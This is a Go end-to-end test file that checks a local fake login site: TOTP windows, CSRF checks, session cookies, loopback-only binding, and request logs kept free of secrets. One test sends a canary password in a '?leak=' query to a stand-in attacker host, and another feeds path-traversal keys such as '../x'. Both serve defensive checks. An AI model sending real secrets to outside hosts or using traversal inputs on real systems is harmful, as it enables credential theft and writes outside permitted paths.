//go:build e2e

package e2e

// Unit tests of the e2e fake site and harness helpers (J1 T22). They need
// no browser and no facto binary.

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/netip"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/FlorianRuen/facto/internal/clock"
	"github.com/FlorianRuen/facto/internal/testsecrets"
)

// Synthetic credentials of the unit tests: never a real account. The
// password is split so that no credential-shaped assignment sits in the
// source for secret scanners (SEC-J1-9); the value is unchanged.
const (
	unitLogin    = "user-synthetic-0001"
	unitPassword = "pw-" + "synthetic-0001"
)

func unitSite(t *testing.T, mode string, mut ...func(*siteOptions)) *fakeSite {
	t.Helper()
	opts := siteOptions{Mode: mode, Login: unitLogin, Password: unitPassword}
	for _, m := range mut {
		m(&opts)
	}
	return startFakeSite(t, opts)
}

// get fetches u with c (redirects are never followed by fakeSite.Client).
func get(t *testing.T, c *http.Client, u string) (*reply, string) {
	t.Helper()
	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, u, nil)
	if err != nil {
		t.Fatalf("new request: %v", err)
	}
	return do(t, c, req)
}

func postForm(t *testing.T, c *http.Client, u string, form url.Values) (*reply, string) {
	t.Helper()
	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, u, strings.NewReader(form.Encode()))
	if err != nil {
		t.Fatalf("new request: %v", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	return do(t, c, req)
}

// reply is a response whose body was read and closed.
type reply struct {
	StatusCode int
	Header     http.Header
}

// Cookies parses the Set-Cookie headers.
func (r *reply) Cookies() []*http.Cookie {
	return (&http.Response{Header: r.Header}).Cookies()
}

func do(t *testing.T, c *http.Client, req *http.Request) (*reply, string) {
	t.Helper()
	resp, err := c.Do(req)
	if err != nil {
		t.Fatalf("%s %s: %v", req.Method, req.URL, err)
	}
	defer func() { _ = resp.Body.Close() }()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		t.Fatalf("read body: %v", err)
	}
	return &reply{StatusCode: resp.StatusCode, Header: resp.Header}, string(b)
}

var csrfRE = regexp.MustCompile(`name="csrf_token" value="([^"]+)"`)

// csrfToken extracts the hidden CSRF field of a served form.
func csrfToken(t *testing.T, body string) string {
	t.Helper()
	m := csrfRE.FindStringSubmatch(body)
	if m == nil {
		t.Fatalf("no csrf_token field in:\n%s", body)
	}
	return m[1]
}

// submitLogin loads the login form on host and posts unitLogin and password.
func submitLogin(t *testing.T, c *http.Client, host, password string) (*reply, string) {
	t.Helper()
	_, body := get(t, c, "https://"+host+"/login")
	return postForm(t, c, "https://"+host+"/login", url.Values{
		"username": {unitLogin}, "password": {password}, "csrf_token": {csrfToken(t, body)},
	})
}

func location(t *testing.T, resp *reply) string {
	t.Helper()
	if resp.StatusCode < 300 || resp.StatusCode > 399 {
		t.Fatalf("status = %d, want a redirect", resp.StatusCode)
	}
	return resp.Header.Get("Location")
}

func sessionCookie(c *http.Client) string {
	u := &url.URL{Scheme: "https", Host: HostWWW, Path: "/"}
	for _, ck := range c.Jar.Cookies(u) {
		if ck.Name == "fp_session" {
			return ck.Value
		}
	}
	return ""
}

func TestFakeSite_ListensOnLoopbackOnly(t *testing.T) {
	t.Parallel()
	s := unitSite(t, ModePassword)
	addr := s.Addr()
	if addr.Addr() != netip.MustParseAddr("127.0.0.1") || addr.Port() == 0 {
		t.Fatalf("Addr() = %v, want 127.0.0.1:<port>", addr)
	}
	// The site answers on its loopback address...
	if resp, _ := get(t, s.Client(t), "https://"+HostWWW+"/login"); resp.StatusCode != http.StatusOK {
		t.Fatalf("GET /login via 127.0.0.1 = %d, want 200", resp.StatusCode)
	}
	// ...and on no other local address: IPv6 loopback and every
	// non-loopback interface address must refuse the connection.
	targets := []netip.Addr{netip.MustParseAddr("::1")}
	ifaddrs, err := net.InterfaceAddrs()
	if err != nil {
		t.Fatalf("interface addrs: %v", err)
	}
	for _, a := range ifaddrs {
		p, ok := netip.AddrFromSlice(a.(*net.IPNet).IP)
		if ok && !p.Unmap().IsLoopback() && !p.IsLinkLocalUnicast() {
			targets = append(targets, p.Unmap())
		}
	}
	for _, ip := range targets {
		d := net.Dialer{Timeout: 2 * time.Second}
		target := netip.AddrPortFrom(ip, addr.Port()).String()
		conn, err := d.DialContext(t.Context(), "tcp", target)
		if err == nil {
			_ = conn.Close()
			t.Errorf("dial %s succeeded: the fake site must listen on 127.0.0.1 only", target)
		}
	}
	t.Logf("fake site on %v; refused on %d other local addresses", addr, len(targets))

	// The leaf certificate is only valid for the served hosts.
	conf := &tls.Config{RootCAs: s.CAPool(), ServerName: "localhost", MinVersion: tls.VersionTLS12}
	d := tls.Dialer{Config: conf}
	if conn, err := d.DialContext(t.Context(), "tcp", addr.String()); err == nil {
		_ = conn.Close()
		t.Error("TLS handshake for ServerName localhost succeeded, want a verification error")
	}
}

// TestFakeSite_TOTPCode checks the RFC 6238 SHA-1 test vectors (appendix
// B), truncated to 6 digits.
func TestFakeSite_TOTPCode(t *testing.T) {
	t.Parallel()
	seed := []byte("12345678901234567890")
	for _, tt := range []struct {
		unix int64
		want string
	}{
		{59, "287082"},
		{1111111109, "081804"},
		{1111111111, "050471"},
		{1234567890, "005924"},
		{2000000000, "279037"},
		{20000000000, "353130"},
	} {
		if got := totpCode(seed, time.Unix(tt.unix, 0)); got != tt.want {
			t.Errorf("totpCode(T=%d) = %q, want %q", tt.unix, got, tt.want)
		}
	}
}

func TestFakeSite_TOTPWindow(t *testing.T) {
	t.Parallel()
	now := time.Date(2026, 3, 14, 10, 0, 15, 0, time.UTC)
	fake := clock.NewFake(now)
	s := unitSite(t, ModeTOTP, func(o *siteOptions) { o.Now = fake.Now })
	tests := []struct {
		name   string
		code   func() string
		accept bool
	}{
		{"previous step", func() string { return s.TOTP(now.Add(-30 * time.Second)) }, true},
		{"current step", func() string { return s.TOTP(now) }, true},
		{"next step", func() string { return s.TOTP(now.Add(30 * time.Second)) }, true},
		{"two steps back", func() string { return s.TOTP(now.Add(-60 * time.Second)) }, false},
		{"two steps ahead", func() string { return s.TOTP(now.Add(60 * time.Second)) }, false},
		{"five digits", func() string { return s.TOTP(now)[:5] }, false},
		{"letters", func() string { return "abcdef" }, false},
		{"empty", func() string { return "" }, false},
		{"seven digits", func() string { return s.TOTP(now) + "0" }, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			c := s.Client(t)
			resp, _ := submitLogin(t, c, HostWWW, unitPassword)
			if loc := location(t, resp); loc != "/login/totp" && loc != "https://"+HostWWW+"/login/totp" {
				t.Fatalf("after password: Location = %q, want /login/totp", loc)
			}
			_, form := get(t, c, "https://"+HostWWW+"/login/totp")
			resp, body := postForm(t, c, "https://"+HostWWW+"/login/totp", url.Values{
				"otp": {tt.code()}, "csrf_token": {csrfToken(t, form)},
			})
			if tt.accept {
				if loc := location(t, resp); !strings.HasSuffix(loc, "/account") {
					t.Errorf("accepted code: Location = %q, want /account", loc)
				}
				if sessionCookie(c) == "" {
					t.Error("accepted code: no fp_session cookie")
				}
				return
			}
			if resp.StatusCode != http.StatusOK || !strings.Contains(body, `id="otp-error"`) {
				t.Errorf("rejected code: status %d, otp-error shown = %v", resp.StatusCode, strings.Contains(body, `id="otp-error"`))
			}
			if sessionCookie(c) != "" {
				t.Error("rejected code: fp_session cookie set")
			}
		})
	}
}

// TestFakeSite_TOTPWindowFollowsClock proves the window is computed from
// the injected clock, not from codes frozen at start.
func TestFakeSite_TOTPWindowFollowsClock(t *testing.T) {
	t.Parallel()
	start := time.Date(2026, 3, 14, 10, 0, 0, 0, time.UTC)
	fake := clock.NewFake(start)
	s := unitSite(t, ModeTOTP, func(o *siteOptions) { o.Now = fake.Now })
	old := s.TOTP(start)
	fake.Advance(5 * time.Minute)
	c := s.Client(t)
	submitLogin(t, c, HostWWW, unitPassword)
	_, form := get(t, c, "https://"+HostWWW+"/login/totp")
	resp, body := postForm(t, c, "https://"+HostWWW+"/login/totp", url.Values{"otp": {old}, "csrf_token": {csrfToken(t, form)}})
	if resp.StatusCode != http.StatusOK || !strings.Contains(body, `id="otp-error"`) {
		t.Errorf("code from 5 minutes ago: status %d, want 200 with #otp-error", resp.StatusCode)
	}
}

func TestFakeSite_RequestLogNoQuerySecrets(t *testing.T) {
	t.Parallel()
	pw := testsecrets.Canary(t, testsecrets.Password)
	tok := testsecrets.Canary(t, testsecrets.Token)
	ck := testsecrets.Canary(t, testsecrets.Cookie)
	s := unitSite(t, ModeSSORedirect, func(o *siteOptions) { o.Password = pw })
	c := s.Client(t)

	// SSO login: the canary password is in a POST body, the site-issued
	// ticket in a query string.
	resp, _ := get(t, c, "https://"+HostWWW+"/login")
	if loc := location(t, resp); loc != "https://"+HostSSO+"/login" {
		t.Fatalf("sso-redirect: Location = %q", loc)
	}
	resp, _ = submitLogin(t, c, HostSSO, pw)
	cb, err := url.Parse(location(t, resp))
	if err != nil || cb.Host != HostWWW || cb.Query().Get("ticket") == "" {
		t.Fatalf("SSO callback = %v (err %v), want www with a ticket", cb, err)
	}
	ticket := cb.Query().Get("ticket")
	resp, _ = get(t, c, cb.String())
	if !strings.HasSuffix(location(t, resp), "/account") || sessionCookie(c) == "" {
		t.Fatal("SSO callback did not open a session")
	}
	session := sessionCookie(c)

	// Canaries in a query, a header and a cookie.
	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet,
		"https://"+HostWWW+"/api/invoices?from=2026-01-01&to=2027-01-01&page=1&token="+url.QueryEscape(tok), nil)
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Authorization", "Bearer "+tok)
	req.AddCookie(&http.Cookie{Name: "extra", Value: ck, Secure: true, HttpOnly: true, SameSite: http.SameSiteLaxMode})
	do(t, c, req)
	get(t, c, "https://"+EvilHost+"/pixel.png?leak="+url.QueryEscape(pw))

	log := s.Requests()
	if len(log) < 6 {
		t.Fatalf("request log has %d entries, want >= 6: %+v", len(log), log)
	}
	js, err := json.Marshal(log)
	if err != nil {
		t.Fatal(err)
	}
	dump := string(js) + fmt.Sprintf("%+v %#v", log, log)
	for name, v := range map[string]string{"password": pw, "token": tok, "cookie": ck, "ticket": ticket, "session": session, "login": unitLogin} {
		if strings.Contains(dump, v) {
			t.Errorf("request log contains the %s value", name)
		}
	}
	for _, forbidden := range []string{"?", "ticket", "from=", "2026-01-01", "Bearer"} {
		if strings.Contains(dump, forbidden) {
			t.Errorf("request log contains %q (query or header data): %s", forbidden, js)
		}
	}
	want := []loggedRequest{
		{Method: "GET", Host: HostWWW, Path: "/login", Status: http.StatusFound},
		{Method: "GET", Host: HostSSO, Path: "/login", Status: http.StatusOK},
		{Method: "POST", Host: HostSSO, Path: "/login", Status: http.StatusSeeOther},
		{Method: "GET", Host: HostWWW, Path: "/sso/callback", Status: http.StatusSeeOther},
		{Method: "GET", Host: HostWWW, Path: "/api/invoices", Status: http.StatusOK},
		{Method: "GET", Host: EvilHost, Path: "/pixel.png", Status: http.StatusOK},
	}
	if !slices.Equal(log, want) {
		t.Errorf("request log =\n  %+v\nwant\n  %+v", log, want)
	}
	s.ResetLog()
	if got := s.Requests(); len(got) != 0 {
		t.Errorf("after ResetLog: %d entries", len(got))
	}
}

// selectorsServed reports which of the CSS selectors (#id or
// input[name=x]) appear in an HTML page.
func selectorsServed(body string, sels []string) (missing []string) {
	for _, sel := range sels {
		var ok bool
		switch {
		case strings.HasPrefix(sel, "#"):
			ok = strings.Contains(body, `id="`+sel[1:]+`"`)
		case strings.HasPrefix(sel, "input[name=") && strings.HasSuffix(sel, "]"):
			name := strings.TrimSuffix(strings.TrimPrefix(sel, "input[name="), "]")
			ok = regexp.MustCompile(`<input[^>]*name="` + regexp.QuoteMeta(name) + `"`).MatchString(body)
		}
		if !ok {
			missing = append(missing, sel)
		}
	}
	return missing
}

// sheetSelectors returns every selector the fakeprovider sheet's "Login
// flow" table names (backticked #id and input[...] tokens).
func sheetSelectors(t *testing.T) []string {
	t.Helper()
	mod, err := moduleRoot()
	if err != nil {
		t.Fatal(err)
	}
	b, err := readIn(filepath.Join(mod, "docs", "connectors"), "fakeprovider.md")
	if err != nil {
		t.Fatalf("read sheet: %v", err)
	}
	_, flow, ok := strings.Cut(string(b), "## Login flow")
	if !ok {
		t.Fatal("sheet has no \"## Login flow\" section")
	}
	table, _, _ := strings.Cut(flow, "\nSequence:")
	var out []string
	for _, m := range regexp.MustCompile("`(#[a-z][a-z0-9-]*|input\\[name=[a-z_]+\\])`").FindAllStringSubmatch(table, -1) {
		if !slices.Contains(out, m[1]) {
			out = append(out, m[1])
		}
	}
	if len(out) < 15 {
		t.Fatalf("parsed %d selectors from the sheet, want >= 15: %q", len(out), out)
	}
	return out
}

func TestFakeSite_ModesServeContractSelectors(t *testing.T) {
	t.Parallel()
	loginForm := []string{"#login-form", "#username", "#password", "#login-submit", "input[name=csrf_token]"}
	type step func(t *testing.T, s *fakeSite, c *http.Client) (*reply, string)
	page := func(host, p string) step {
		return func(t *testing.T, _ *fakeSite, c *http.Client) (*reply, string) {
			return get(t, c, "https://"+host+p)
		}
	}
	afterLogin := func(pw string, then string) step {
		return func(t *testing.T, _ *fakeSite, c *http.Client) (*reply, string) {
			resp, body := submitLogin(t, c, HostWWW, pw)
			if then == "" {
				return resp, body
			}
			return get(t, c, "https://"+HostWWW+then)
		}
	}
	wrongCode := func(p, field string) step {
		return func(t *testing.T, _ *fakeSite, c *http.Client) (*reply, string) {
			submitLogin(t, c, HostWWW, unitPassword)
			_, form := get(t, c, "https://"+HostWWW+p)
			return postForm(t, c, "https://"+HostWWW+p, url.Values{field: {"000000x"}, "csrf_token": {csrfToken(t, form)}})
		}
	}
	tests := []struct {
		name     string
		mode     string
		step     step
		wantURL  string // final URL path (no redirect followed): the page itself
		want     []string
		mustNot  []string
		wantCode int
	}{
		{name: "password form", mode: ModePassword, step: page(HostWWW, "/login"), want: loginForm, mustNot: []string{"#login-error", "#captcha"}},
		{name: "bad password error", mode: ModeBadPassword, step: afterLogin(unitPassword, ""), want: append([]string{"#login-error"}, loginForm...)},
		{name: "wrong password in password mode", mode: ModePassword, step: afterLogin("wrong-synthetic", ""), want: append([]string{"#login-error"}, loginForm...)},
		{name: "account after password", mode: ModePassword, step: afterLogin(unitPassword, "/account"), want: []string{"#account"}, mustNot: []string{"#login-form"}},
		{name: "totp form", mode: ModeTOTP, step: afterLogin(unitPassword, "/login/totp"), want: []string{"#otp-form", "#otp", "#otp-submit", "input[name=csrf_token]"}, mustNot: []string{"#otp-error"}},
		{name: "totp wrong code", mode: ModeTOTP, step: wrongCode("/login/totp", "otp"), want: []string{"#otp-form", "#otp", "#otp-submit", "#otp-error"}},
		{name: "email form", mode: ModeEmailOTP, step: afterLogin(unitPassword, "/login/email"), want: []string{"#email-code-form", "#email-code", "#email-code-submit", "input[name=csrf_token]"}, mustNot: []string{"#email-code-error"}},
		{name: "email wrong code", mode: ModeEmailOTP, step: wrongCode("/login/email", "email_code"), want: []string{"#email-code-form", "#email-code", "#email-code-submit", "#email-code-error"}},
		{name: "captcha page", mode: ModeCaptcha, step: page(HostWWW, "/login/captcha"), want: []string{"#captcha"}, mustNot: []string{"#login-form", "#username", "#password"}},
		{name: "sso form", mode: ModeSSORedirect, step: page(HostSSO, "/login"), want: loginForm},
		{name: "site changed renames every login selector", mode: ModeSiteChanged, step: page(HostWWW, "/login"), mustNot: append([]string{"#captcha"}, loginForm[:4]...)},
		{name: "account without session", mode: ModePassword, step: page(HostWWW, "/account"), mustNot: []string{"#account"}, wantCode: http.StatusFound},
	}
	covered := map[string]bool{}
	for _, tt := range tests {
		for _, sel := range tt.want {
			covered[sel] = true
		}
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			s := unitSite(t, tt.mode)
			resp, body := tt.step(t, s, s.Client(t))
			wantCode := tt.wantCode
			if wantCode == 0 {
				wantCode = http.StatusOK
			}
			if resp.StatusCode != wantCode {
				t.Fatalf("status = %d, want %d", resp.StatusCode, wantCode)
			}
			if missing := selectorsServed(body, tt.want); len(missing) > 0 {
				t.Errorf("selectors not served: %q\n%s", missing, body)
			}
			for _, sel := range tt.mustNot {
				if len(selectorsServed(body, []string{sel})) == 0 {
					t.Errorf("selector %s served, must not be", sel)
				}
			}
		})
	}
	// Captcha mode answers the login URL with the captcha page (contract:
	// "served instead of the form").
	t.Run("captcha mode redirects the login form", func(t *testing.T) {
		t.Parallel()
		s := unitSite(t, ModeCaptcha)
		resp, _ := get(t, s.Client(t), "https://"+HostWWW+"/login")
		if loc := location(t, resp); !strings.HasSuffix(loc, "/login/captcha") {
			t.Errorf("captcha mode /login: Location = %q, want /login/captcha", loc)
		}
	})
	// Every selector of the sheet is served by at least one case above.
	for _, sel := range sheetSelectors(t) {
		if !covered[sel] {
			t.Errorf("sheet selector %s is not served by any mode of the fake site test table", sel)
		}
	}
}

func TestFakeSite_CSRFEnforced(t *testing.T) {
	t.Parallel()
	for _, host := range []string{HostWWW, HostSSO} {
		for _, tt := range []struct {
			name  string
			token func(t *testing.T, s *fakeSite, form string) string
		}{
			{"missing", func(*testing.T, *fakeSite, string) string { return "" }},
			{"forged", func(*testing.T, *fakeSite, string) string { return "forged-synthetic-token" }},
			{"from another client", func(t *testing.T, s *fakeSite, _ string) string {
				_, other := get(t, s.Client(t), "https://"+host+"/login")
				return csrfToken(t, other)
			}},
		} {
			t.Run(host+"/"+tt.name, func(t *testing.T) {
				t.Parallel()
				mode := ModePassword
				if host == HostSSO {
					mode = ModeSSORedirect
				}
				s := unitSite(t, mode)
				c := s.Client(t)
				_, form := get(t, c, "https://"+host+"/login")
				resp, _ := postForm(t, c, "https://"+host+"/login", url.Values{
					"username": {unitLogin}, "password": {unitPassword}, "csrf_token": {tt.token(t, s, form)},
				})
				if resp.StatusCode != http.StatusForbidden {
					t.Errorf("status = %d, want 403", resp.StatusCode)
				}
				if sessionCookie(c) != "" {
					t.Error("a session was opened without a valid CSRF token")
				}
			})
		}
	}
}

func TestFakeSite_SessionCookieHostOnlyOnWWW(t *testing.T) {
	t.Parallel()
	for _, mode := range []string{ModePassword, ModeSSORedirect} {
		t.Run(mode, func(t *testing.T) {
			t.Parallel()
			s := unitSite(t, mode)
			c := s.Client(t)
			host := HostWWW
			if mode == ModeSSORedirect {
				host = HostSSO
			}
			resp, _ := submitLogin(t, c, host, unitPassword)
			if mode == ModeSSORedirect {
				for _, ck := range resp.Cookies() {
					if ck.Name == "fp_session" {
						t.Errorf("SSO host set fp_session (must be www only)")
					}
				}
				resp, _ = get(t, c, location(t, resp))
			}
			var raw string
			for _, h := range resp.Header.Values("Set-Cookie") {
				if strings.HasPrefix(h, "fp_session=") {
					raw = h
				}
			}
			if raw == "" {
				t.Fatalf("no fp_session Set-Cookie: %q", resp.Header.Values("Set-Cookie"))
			}
			lower := strings.ToLower(raw)
			if strings.Contains(lower, "domain=") {
				t.Error("fp_session carries a Domain attribute (want host-only)")
			}
			for _, attr := range []string{"; secure", "; httponly", "; path=/"} {
				if !strings.Contains(lower, attr) {
					t.Errorf("fp_session lacks %q", attr)
				}
			}
			// The session is accepted by the API, and only on www.
			if r, _ := get(t, c, "https://"+HostWWW+"/api/me"); r.StatusCode != http.StatusOK {
				t.Errorf("/api/me with the session = %d, want 200", r.StatusCode)
			}
		})
	}
}

func TestFakeSite_LoginPageLoadsOffAllowlistResource(t *testing.T) {
	t.Parallel()
	for _, mode := range []string{ModePassword, ModeSSORedirect, ModeCaptcha} {
		t.Run(mode, func(t *testing.T) {
			t.Parallel()
			s := unitSite(t, mode)
			c := s.Client(t)
			p := map[string]string{ModePassword: HostWWW + "/login", ModeSSORedirect: HostSSO + "/login", ModeCaptcha: HostWWW + "/login/captcha"}[mode]
			_, body := get(t, c, "https://"+p)
			if !strings.Contains(body, `src="https://`+EvilHost+`/`) {
				t.Errorf("login page does not reference https://%s/: %s", EvilHost, body)
			}
			// evil.test is served (so a leak would be logged), never trusted.
			s.ResetLog()
			resp, _ := get(t, c, "https://"+EvilHost+"/pixel.png")
			if resp.StatusCode != http.StatusOK {
				t.Errorf("evil.test status = %d", resp.StatusCode)
			}
			if got := s.Requests(); len(got) != 1 || got[0].Host != EvilHost {
				t.Errorf("evil.test request not logged: %+v", got)
			}
		})
	}
}

func TestFakeSite_LoginPageHookRunsWhileServing(t *testing.T) {
	t.Parallel()
	calls := make(chan string, 8)
	s := unitSite(t, ModeSSORedirect, func(o *siteOptions) {
		o.OnLoginPage = func(r *http.Request) { calls <- r.Host + r.URL.Path }
	})
	c := s.Client(t)
	get(t, c, "https://"+HostWWW+"/login") // redirect only: no page served
	get(t, c, "https://"+HostSSO+"/login")
	get(t, c, "https://"+HostWWW+"/api/me")
	close(calls)
	var got []string
	for v := range calls {
		got = append(got, v)
	}
	if !slices.Equal(got, []string{HostSSO + "/login"}) {
		t.Errorf("OnLoginPage calls = %q, want exactly the served SSO login page", got)
	}
}

func TestFakeSite_UnknownHostRefused(t *testing.T) {
	t.Parallel()
	s := unitSite(t, ModePassword)
	c := s.Client(t)
	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, "https://"+HostWWW+"/login", nil)
	if err != nil {
		t.Fatal(err)
	}
	req.Host = "fakeprovider.test" // parent domain: not served
	resp, body := do(t, c, req)
	if resp.StatusCode != http.StatusMisdirectedRequest || strings.Contains(body, "login-form") {
		t.Errorf("parent-domain Host: status %d, want 421 without a form", resp.StatusCode)
	}
}

func TestFakeSite_APIModes(t *testing.T) {
	t.Parallel()
	amount := int64(8412)
	pdf := []byte("%PDF-1.4\n% synthetic e2e fixture\n")
	invoices := []siteInvoice{
		{FakeInvoice: FakeInvoice{ID: "FP-2026-0001", Contract: "C-1", IssuedAt: "2026-03-14", AmountCents: &amount, Currency: "EUR"}, PDF: pdf},
		{FakeInvoice: FakeInvoice{ID: "FP-2025-0009", Contract: "C-1", IssuedAt: "2025-12-31"}, PDF: pdf},
	}
	type call struct {
		path       string
		wantStatus int
		wantBody   string // substring
	}
	list := "/api/invoices?from=2026-01-01&to=2027-01-01&page=1"
	tests := []struct {
		name  string
		mode  string
		mut   func(*siteOptions)
		login bool
		calls []call
	}{
		{name: "no session", mode: ModePassword, calls: []call{
			{"/api/me", 401, ""}, {list, 401, ""}, {"/api/invoices/FP-2026-0001/pdf", 401, ""},
		}},
		{name: "password", mode: ModePassword, login: true, calls: []call{
			{"/api/me", 200, `"account":`},
			{list, 200, `{"invoices":[{"id":"FP-2026-0001","contract":"C-1","issued_at":"2026-03-14","amount_cents":8412,"currency":"EUR"}],"next_page":null}`},
			{"/api/invoices?from=2025-01-01&to=2026-01-01&page=1", 200, `"id":"FP-2025-0009"`},
			{"/api/invoices?from=2024-01-01&to=2025-01-01&page=1", 200, `{"invoices":[],"next_page":null}`},
			{"/api/invoices/FP-2026-0001/pdf", 200, "%PDF-"},
			{"/api/invoices/FP-2099-0001/pdf", 404, ""},
		}},
		{name: "expired session", mode: ModeExpiredSession, mut: func(o *siteOptions) { o.ExpireAfter = 2 }, login: true, calls: []call{
			{"/api/me", 200, ""}, {list, 200, ""}, {"/api/me", 401, ""}, {list, 401, ""},
		}},
		{name: "rate limit", mode: ModeRateLimit, mut: func(o *siteOptions) { o.RateLimitAfter = 1 }, login: true, calls: []call{
			{"/api/me", 200, ""}, {list, 429, ""}, {"/api/me", 429, ""},
		}},
		{name: "rate limit from the first request", mode: ModeRateLimit, login: true, calls: []call{{"/api/me", 429, ""}}},
		{name: "site changed", mode: ModeSiteChanged, login: true, calls: []call{
			{list, 404, ""}, {"/api/me", 200, ""},
		}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			muts := []func(*siteOptions){func(o *siteOptions) { o.Invoices = invoices }}
			if tt.mut != nil {
				muts = append(muts, tt.mut)
			}
			s := unitSite(t, tt.mode, muts...)
			c := s.Client(t)
			if tt.login {
				if tt.mode == ModeSiteChanged {
					s.openSessionForTest(t, c) // the renamed form cannot be posted by selector
				} else {
					submitLogin(t, c, HostWWW, unitPassword)
				}
				if sessionCookie(c) == "" {
					t.Fatal("login opened no session")
				}
			}
			for i, cl := range tt.calls {
				resp, body := get(t, c, "https://"+HostWWW+cl.path)
				if resp.StatusCode != cl.wantStatus {
					t.Errorf("call %d %s: status %d, want %d", i, cl.path, resp.StatusCode, cl.wantStatus)
				}
				if cl.wantBody != "" && !strings.Contains(body, cl.wantBody) {
					t.Errorf("call %d %s: body %q does not contain %q", i, cl.path, body, cl.wantBody)
				}
				if resp.StatusCode == http.StatusTooManyRequests && resp.Header.Get("Retry-After") == "" {
					t.Errorf("call %d: 429 without Retry-After", i)
				}
				if strings.Contains(cl.path, "/pdf") && resp.StatusCode == http.StatusOK && resp.Header.Get("Content-Type") != "application/pdf" {
					t.Errorf("pdf Content-Type = %q", resp.Header.Get("Content-Type"))
				}
				if strings.HasPrefix(cl.path, "/api/invoices?") && resp.StatusCode == http.StatusOK && resp.Header.Get("Content-Type") != "application/json" {
					t.Errorf("list Content-Type = %q", resp.Header.Get("Content-Type"))
				}
			}
		})
	}
}

func TestFakeSite_EmailOutbox(t *testing.T) {
	t.Parallel()
	s := unitSite(t, ModeEmailOTP)
	c := s.Client(t)
	resp, _ := submitLogin(t, c, HostWWW, unitPassword)
	if !strings.HasSuffix(location(t, resp), "/login/email") {
		t.Fatalf("after password: Location = %q, want /login/email", resp.Header.Get("Location"))
	}
	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()
	code, err := s.WaitOutbox(ctx, 0)
	if err != nil || !regexp.MustCompile(`^[0-9]{6}$`).MatchString(code) {
		t.Fatalf("outbox[0] = %q, %v; want a 6-digit code", code, err)
	}
	_, form := get(t, c, "https://"+HostWWW+"/login/email")
	resp, _ = postForm(t, c, "https://"+HostWWW+"/login/email", url.Values{"email_code": {code}, "csrf_token": {csrfToken(t, form)}})
	if !strings.HasSuffix(location(t, resp), "/account") || sessionCookie(c) == "" {
		t.Errorf("right email code: no session (status %d)", resp.StatusCode)
	}
	// No second message was sent: waiting for one times out.
	short, cancel2 := context.WithTimeout(t.Context(), 100*time.Millisecond)
	defer cancel2()
	if _, err := s.WaitOutbox(short, 1); !errors.Is(err, context.DeadlineExceeded) {
		t.Errorf("WaitOutbox(1) err = %v, want DeadlineExceeded", err)
	}
}

func TestCheckRequests(t *testing.T) {
	t.Parallel()
	n := func(i int) *int { return &i }
	log := []loggedRequest{
		{Method: "GET", Host: HostWWW, Path: "/login", Status: 200},
		{Method: "POST", Host: HostWWW, Path: "/login", Status: 303},
		{Method: "GET", Host: HostWWW, Path: "/api/me", Status: 200},
		{Method: "GET", Host: HostWWW, Path: "/api/invoices", Status: 429},
	}
	tests := []struct {
		name string
		exp  RequestExpect
		ok   bool
	}{
		{"exact count", RequestExpect{Method: "POST", Path: "/login", Count: n(1)}, true},
		{"exact count wrong", RequestExpect{Path: "/login", Count: n(1)}, false},
		{"zero evil", RequestExpect{Host: EvilHost, Count: n(0)}, true},
		{"prefix min", RequestExpect{Path: "/api/*", Min: n(2)}, true},
		{"prefix min too high", RequestExpect{Path: "/api/*", Min: n(3)}, false},
		{"prefix is not a substring", RequestExpect{Path: "/pi/*", Count: n(0)}, true},
		{"last 429", RequestExpect{Status: 429, Last: true}, true},
		{"last is not 200", RequestExpect{Status: 200, Last: true}, false},
		{"sso none", RequestExpect{Host: HostSSO, Count: n(0)}, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := checkRequests(log, []RequestExpect{tt.exp})
			if (err == nil) != tt.ok {
				t.Errorf("checkRequests(%+v) = %v, want ok=%v", tt.exp, err, tt.ok)
			}
		})
	}
	if err := checkRequests(nil, []RequestExpect{{Status: 200, Last: true}}); err == nil {
		t.Error("last on an empty log must fail")
	}
}

func TestWriteSecrets_PrivateTree(t *testing.T) {
	t.Parallel()
	pw := testsecrets.Canary(t, testsecrets.Password)
	root := t.TempDir()
	dir := filepath.Join(root, "secrets")
	if err := writeSecrets(t.Context(), dir, map[string]string{"fp/password": pw, "fp/login": "user-synthetic-0001"}); err != nil {
		t.Fatalf("writeSecrets: %v", err)
	}
	for _, p := range []string{dir, filepath.Join(dir, "fp")} {
		fi, err := os.Lstat(p)
		if err != nil || !fi.IsDir() || fi.Mode().Perm() != 0o700 {
			t.Errorf("%s: %v, err %v; want a 0700 directory", p, fi.Mode(), err)
		}
	}
	got, err := readIn(dir, filepath.Join("fp", "password"))
	if err != nil || string(got) != pw {
		t.Errorf("fp/password content differs (err %v)", err)
	}
	fi, err := os.Lstat(filepath.Join(dir, "fp", "password"))
	if err != nil || fi.Mode().Perm() != 0o600 {
		t.Errorf("fp/password mode = %v (err %v), want 0600", fi.Mode(), err)
	}
	// Keys that would leave the directory are refused, nothing is written.
	for _, bad := range []string{"../x", "fp/../../x", "/abs/x", "fp/.", "fp", "a/b/c"} {
		other := filepath.Join(root, "bad")
		if err := writeSecrets(t.Context(), other, map[string]string{bad: "v"}); err == nil {
			t.Errorf("writeSecrets(%q) succeeded, want an error", bad)
		}
	}
}
